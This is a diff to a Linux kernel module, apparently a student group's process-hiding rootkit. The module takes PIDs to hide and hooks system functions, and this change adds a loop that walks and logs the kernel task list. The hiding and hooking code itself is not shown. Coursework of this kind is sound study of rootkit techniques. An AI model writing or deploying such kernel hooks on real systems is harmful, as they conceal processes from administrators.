@@ -9,6 +9,8 @@
 #include <linux/dirent.h>
 #include <asm/uaccess.h>
 #include <linux/moduleparam.h>
+#include <linux/init_task.h>
+#include <linux/sched.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 
@@ -201,11 +203,18 @@ int print_nr_procs(void){
 static int __init _init_module(void)
 {
     int i;
+    struct task_struct *task;
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
     printk(KERN_INFO "Received %d PIDs to hide:\n", pids_count);
     for (i = 0; i < sizeof(pids_to_hide)/sizeof(int); i++) {
         printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
     }
+
+    task = &init_task;
+    do {
+        printk(KERN_INFO "Task %s (%d) hast parent: %s\n", task->comm, task->pid, task->parent->comm);
+    } while ((task = next_task(task)) != &init_task);
+
     print_nr_procs();
     hook_functions();
     return 0;
